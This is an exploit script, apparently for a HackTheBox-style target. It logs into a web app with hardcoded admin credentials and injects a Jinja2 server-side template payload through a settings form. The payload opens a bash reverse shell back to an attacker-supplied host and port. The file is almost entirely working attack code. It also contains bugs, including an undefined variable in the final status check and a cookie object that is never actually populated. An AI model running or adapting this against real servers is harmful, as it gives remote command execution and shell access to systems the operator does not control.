#!/usr/bin/env python3

'''
Author: Uday
X: https://x.com/udaypro2008
Github: https://github.com/ExtremeUday
HackTheBox : ExtremeUday2
'''

import requests
import argparse
from bs4 import BeautifulSoup
from http.cookies import SimpleCookie
import urllib.parse
import base64


parser = argparse.ArgumentParser()
parser.add_argument('-url', help="Target Url", required=True)
parser.add_argument('-lhost', help="Lhost", required=True)
parser.add_argument('-lport', help="Lport", required=True)

args = parser.parse_args()
proxy = {'http':'http://127.0.0.1:8080'}

def csrf():
	s = requests.Session()
	token_req = s.get(args.url)
	soup = BeautifulSoup(token_req.text, "html.parser")
	token_reg = soup.find('input', {'name':'csrf_token'})
	token = token_reg.get('value')
	if token:
		print('[+] CSRF Token Found ', token)
		return token
	else:
		print('[-] CSRF Token Not Found')

def cookie():
	s = requests.Session()
	t = csrf()
	data = {
			'username':'admin',
			'password':'superadministrator',
			'login':''
            }
	r = requests.post(args.url + '/login', data=data, allow_redirects=False, proxies=proxy)
	header_cookie = r.headers.get('Set-Cookie')
	if header_cookie:
		cookie_object = SimpleCookie()
		final_cookie = cookie_object.load(header_cookie)
	else:
		print('[-] No cookie for you')

	r1 = s.post(args.url + '/login', data=data, proxies=proxy, cookies=final_cookie)
	if r1.status_code == 200:
		print("[+] Login Successful")
	else:
		print("[-] Login Failed with status code: ", r1.status_code)

	payload = f"{{{{request.application.__globals__.__builtins__.__import__('os').popen('/bin/bash -c \"/bin/bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1\" ').read()}}}}"
	data = {
            'name':payload
            }


	print("[+] Sending Payload ")
	subu = s.post(args.url + '/settings', data=data, proxies=proxy)
	if udu.status_code != 200:
		print("[-] Login failed with status code: ", subu.status_code)



cookie()